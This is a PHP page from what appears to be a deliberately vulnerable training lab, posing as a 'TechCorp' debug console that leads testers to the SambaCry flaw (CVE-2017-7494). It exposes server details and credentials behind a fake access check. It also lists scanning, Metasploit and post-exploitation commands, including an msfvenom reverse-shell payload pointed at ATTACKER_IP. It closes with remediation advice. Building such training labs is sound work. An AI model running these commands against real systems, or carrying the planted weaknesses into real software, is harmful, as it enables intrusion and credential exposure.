<?php
// 管理后台调试页面 - 提供更深层的线索和技术细节
session_start();

// 简单的访问控制（实际上任何人都可以访问，只是看起来有保护）
$is_admin = isset($_SESSION['role']) && $_SESSION['role'] === 'admin';
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>调试信息 - TechCorp Admin</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            background: #2d2d30;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #007acc;
        }

        .header h1 {
            color: #4ec9b0;
            margin-bottom: 10px;
        }

        .section {
            background: #252526;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
            border: 1px solid #3e3e42;
        }

        .section h2 {
            color: #4fc1ff;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #3e3e42;
        }

        .code-block {
            background: #1e1e1e;
            padding: 15px;
            border-radius: 3px;
            border-left: 3px solid #4ec9b0;
            margin: 10px 0;
            overflow-x: auto;
        }

        .code-block pre {
            margin: 0;
            color: #ce9178;
        }

        .warning {
            background: #5a1e1e;
            border-left: 3px solid #f48771;
            padding: 15px;
            margin: 10px 0;
            border-radius: 3px;
        }

        .info {
            background: #1e3a5a;
            border-left: 3px solid #4fc1ff;
            padding: 15px;
            margin: 10px 0;
            border-radius: 3px;
        }

        .success {
            background: #1e5a1e;
            border-left: 3px solid #89d185;
            padding: 15px;
            margin: 10px 0;
            border-radius: 3px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
        }

        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #3e3e42;
        }

        th {
            color: #4ec9b0;
            font-weight: bold;
        }

        tr:hover {
            background: #2d2d30;
        }

        .highlight {
            color: #f48771;
            font-weight: bold;
        }

        .link {
            color: #4fc1ff;
            text-decoration: none;
        }

        .link:hover {
            text-decoration: underline;
        }

        .badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 3px;
            font-size: 0.85em;
            font-weight: bold;
        }

        .badge-danger {
            background: #f48771;
            color: #1e1e1e;
        }

        .badge-warning {
            background: #dcdcaa;
            color: #1e1e1e;
        }

        .badge-info {
            background: #4fc1ff;
            color: #1e1e1e;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔧 TechCorp Debug Console</h1>
            <p>系统调试与诊断信息 | Internal Use Only</p>
            <?php if (!$is_admin): ?>
            <p style="color: #dcdcaa; margin-top: 10px;">⚠️ 警告：您未以管理员身份登录，部分信息可能受限</p>
            <?php endif; ?>
        </div>

        <!-- 服务器环境信息 -->
        <div class="section">
            <h2>📊 服务器环境信息</h2>
            <table>
                <tr>
                    <th>项目</th>
                    <th>值</th>
                </tr>
                <tr>
                    <td>PHP 版本</td>
                    <td><?= phpversion() ?></td>
                </tr>
                <tr>
                    <td>服务器软件</td>
                    <td><?= $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown' ?></td>
                </tr>
                <tr>
                    <td>操作系统</td>
                    <td><?= php_uname() ?></td>
                </tr>
                <tr>
                    <td>服务器IP</td>
                    <td><?= $_SERVER['SERVER_ADDR'] ?? 'Unknown' ?></td>
                </tr>
                <tr>
                    <td>文档根目录</td>
                    <td><?= $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown' ?></td>
                </tr>
            </table>
        </div>

        <!-- 网络架构 -->
        <div class="section">
            <h2>🌐 网络架构与服务拓扑</h2>
            <div class="info">
                <strong>三层架构设计：</strong><br><br>
                <pre style="color: #4ec9b0;">
┌─────────────────────────────────────────────┐
│  Layer 1: Web Frontend (Apache + PHP)      │
│  Container: target_web                      │
│  Port: 8080                                 │
│  Purpose: 用户界面和业务逻辑                │
└─────────────┬───────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────┐
│  Layer 2: Database (MySQL 5.7)              │
│  Container: target_mysql                    │
│  Port: 3306                                 │
│  Purpose: 数据存储和配置管理                │
└─────────────┬───────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────┐
│  Layer 3: File Server (Samba 4.6.3)        │
│  Container: target_samba                    │
│  Ports: 445, 139, 6699                      │
│  Purpose: 文件共享和存储                    │
└─────────────────────────────────────────────┘
                </pre>
            </div>

            <div class="code-block">
                <strong>容器互连配置：</strong>
                <pre>
Network: target_network (bridge mode)
DNS Resolution: 容器间可通过容器名互相访问

Web -> MySQL: mysql:3306
Web -> Samba: fileserver:445
Direct Access: host -> samba:445 (端口映射)
                </pre>
            </div>
        </div>

        <!-- SMB服务详细信息 -->
        <div class="section">
            <h2>📁 Samba 文件服务器详细信息</h2>

            <div class="warning">
                <strong>🔴 严重安全警告：</strong><br>
                检测到 Samba 版本 <span class="highlight">4.6.3</span> 存在严重的远程代码执行漏洞！<br>
                漏洞编号: <span class="highlight">CVE-2017-7494</span><br>
                危险等级: <span class="badge badge-danger">CRITICAL</span><br>
                CVSS评分: <span class="highlight">10.0</span> (最高危)
            </div>

            <table>
                <tr>
                    <td><strong>服务名称</strong></td>
                    <td>Samba/CIFS File Server</td>
                </tr>
                <tr>
                    <td><strong>版本</strong></td>
                    <td><span class="highlight">4.6.3</span> <span class="badge badge-danger">VULNERABLE</span></td>
                </tr>
                <tr>
                    <td><strong>容器名</strong></td>
                    <td>target_samba</td>
                </tr>
                <tr>
                    <td><strong>主机名</strong></td>
                    <td>fileserver</td>
                </tr>
                <tr>
                    <td><strong>监听端口</strong></td>
                    <td>445 (SMB), 139 (NetBIOS), 6699 (Custom)</td>
                </tr>
                <tr>
                    <td><strong>共享名称</strong></td>
                    <td>myshare</td>
                </tr>
                <tr>
                    <td><strong>共享路径</strong></td>
                    <td>/home/share</td>
                </tr>
                <tr>
                    <td><strong>访问控制</strong></td>
                    <td>Guest OK (无需认证) <span class="badge badge-warning">INSECURE</span></td>
                </tr>
                <tr>
                    <td><strong>读写权限</strong></td>
                    <td>Read/Write</td>
                </tr>
            </table>

            <div class="code-block">
                <strong>SMB配置文件 (/usr/local/samba/etc/smb.conf):</strong>
                <pre>
[global]
    map to guest = Bad User
    server string = Samba Server Version %v
    guest account = nobody

[myshare]
    path = /home/share
    read only = no
    guest ok = yes
    guest only = yes
                </pre>
            </div>
        </div>

        <!-- CVE-2017-7494 详细信息 -->
        <div class="section">
            <h2>🚨 CVE-2017-7494 漏洞分析</h2>

            <div class="warning">
                <strong>漏洞名称:</strong> Samba Remote Code Execution (SambaCry)<br>
                <strong>影响版本:</strong> Samba 3.5.0 - 4.6.4 (当前版本 4.6.3 受影响)<br>
                <strong>漏洞类型:</strong> 远程代码执行 (RCE)<br>
                <strong>危害程度:</strong> 攻击者可以上传恶意.so文件并触发执行，获取服务器完全控制权
            </div>

            <div class="info">
                <strong>📚 漏洞原理：</strong><br><br>
                1. Samba允许客户端上传共享库文件(.so)到可写共享目录<br>
                2. 如果共享目录同时具有执行权限，攻击者可以指定加载路径<br>
                3. 通过特制的SMB请求，可以让服务器加载并执行恶意代码<br>
                4. 由于当前配置允许Guest访问且可读写，漏洞利用条件完全满足
            </div>

            <div class="code-block">
                <strong>漏洞利用条件检查：</strong>
                <pre>
✅ Samba版本在3.5.0-4.6.4范围内: <span class="highlight">YES (4.6.3)</span>
✅ 共享目录可写: <span class="highlight">YES (read only = no)</span>
✅ 允许Guest访问: <span class="highlight">YES (guest ok = yes)</span>
✅ 端口445可访问: <span class="highlight">YES (已映射到主机)</span>

<span class="highlight">结论: 系统完全暴露于CVE-2017-7494漏洞利用！</span>
                </pre>
            </div>

            <div class="success">
                <strong>🎯 建议的攻击路径（仅用于安全测试）：</strong><br><br>
                1. 确认目标IP和端口 (docker inspect target_samba | grep IPAddress)<br>
                2. 扫描SMB服务并确认版本 (nmap -p 445 --script smb-protocols TARGET_IP)<br>
                3. 下载CVE-2017-7494 exploit脚本<br>
                4. 配置payload和监听器<br>
                5. 执行exploit获取shell<br>
            </div>
        </div>

        <!-- 渗透测试工具和命令 -->
        <div class="section">
            <h2>🛠️ 渗透测试工具与命令参考</h2>

            <h3 style="color: #dcdcaa; margin-top: 20px;">侦察阶段：</h3>
            <div class="code-block">
                <pre>
# 端口扫描
nmap -p 445,139,8080,3306 -sV TARGET_IP

# SMB版本探测
nmap -p 445 --script smb-protocols,smb-os-discovery TARGET_IP

# SMB漏洞扫描
nmap -p 445 --script smb-vuln* TARGET_IP

# 列出SMB共享
smbclient -L //TARGET_IP -N

# 连接到共享
smbclient //TARGET_IP/myshare -N
                </pre>
            </div>

            <h3 style="color: #dcdcaa; margin-top: 20px;">漏洞利用阶段：</h3>
            <div class="code-block">
                <pre>
# 下载exploit（示例）
git clone https://github.com/joxeankoret/CVE-2017-7494
cd CVE-2017-7494

# 使用Metasploit
msfconsole
use exploit/linux/samba/is_known_pipename
set RHOSTS TARGET_IP
set TARGET 3
exploit

# 使用Python exploit
python cve_2017_7494.py -t TARGET_IP -p 445 -s myshare

# 手动利用（高级）
# 1. 生成恶意.so文件
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf-so -o evil.so

# 2. 上传到SMB共享
smbclient //TARGET_IP/myshare -N -c "put evil.so"

# 3. 触发执行（需要特定的SMB请求）
                </pre>
            </div>

            <h3 style="color: #dcdcaa; margin-top: 20px;">后渗透阶段：</h3>
            <div class="code-block">
                <pre>
# 获取shell后的操作
whoami
uname -a
cat /etc/passwd
ls -la /home/share
find / -type f -name "flag*" 2>/dev/null
                </pre>
            </div>
        </div>

        <!-- 防御建议 -->
        <div class="section">
            <h2>🛡️ 防御与修复建议</h2>

            <div class="info">
                <strong>立即措施：</strong><br>
                1. 升级Samba到4.6.4或更高版本<br>
                2. 禁用Guest访问，实施强身份验证<br>
                3. 设置共享目录为只读（如非必要）<br>
                4. 配置防火墙限制SMB端口访问<br>
                5. 启用SMB签名和加密<br>
                6. 监控异常的SMB连接和文件操作
            </div>

            <div class="code-block">
                <strong>安全配置示例：</strong>
                <pre>
[global]
    map to guest = Never
    server signing = mandatory
    smb encrypt = required

[myshare]
    path = /home/share
    read only = yes
    guest ok = no
    valid users = @smbgroup
    create mask = 0640
    directory mask = 0750
                </pre>
            </div>
        </div>

        <!-- 相关资源 -->
        <div class="section">
            <h2>📚 相关资源与参考</h2>
            <ul style="line-height: 2;">
                <li><a href="https://www.samba.org/samba/security/CVE-2017-7494.html" class="link" target="_blank">Samba官方安全公告</a></li>
                <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7494" class="link" target="_blank">NVD漏洞详情</a></li>
                <li><a href="https://github.com/joxeankoret/CVE-2017-7494" class="link" target="_blank">GitHub Exploit Repository</a></li>
                <li><a href="https://www.rapid7.com/db/modules/exploit/linux/samba/is_known_pipename/" class="link" target="_blank">Metasploit模块</a></li>
                <li><a href="../?page=system" class="link">返回系统信息页面</a></li>
                <li><a href="../" class="link">返回主页</a></li>
            </ul>
        </div>

        <!-- 环境变量 -->
        <div class="section">
            <h2>🔐 环境变量与凭证</h2>
            <div class="warning">
                以下信息高度敏感，仅限授权人员查看
            </div>
            <div class="code-block">
                <pre>
DB_HOST=mysql
DB_USER=webuser
DB_PASS=webpass123
DB_NAME=company_db

SMB_SERVER=fileserver
SMB_PORT=445
SMB_SHARE=myshare
SMB_AUTH=guest (no password)

CONTAINER_NETWORK=target_network
WEB_PORT=8080
MYSQL_PORT=3306
SMB_PORT=445
                </pre>
            </div>
        </div>

        <!-- Footer -->
        <div style="text-align: center; padding: 20px; color: #6a6a6a; border-top: 1px solid #3e3e42; margin-top: 30px;">
            <p>TechCorp Debug Console v1.0 | For Internal Security Testing Only</p>
            <p style="margin-top: 10px; font-size: 0.9em;">
                ⚠️ 此页面包含敏感信息，生产环境请删除或加强访问控制
            </p>
        </div>
    </div>
</body>
</html>

<!--
    开发者备注：
    - 这个页面故意暴露了大量技术细节
    - 目的是引导渗透测试者找到CVE-2017-7494漏洞
    - 真实环境中绝对不应该有这样的调试页面！
    - 所有信息都是为了教学目的
-->
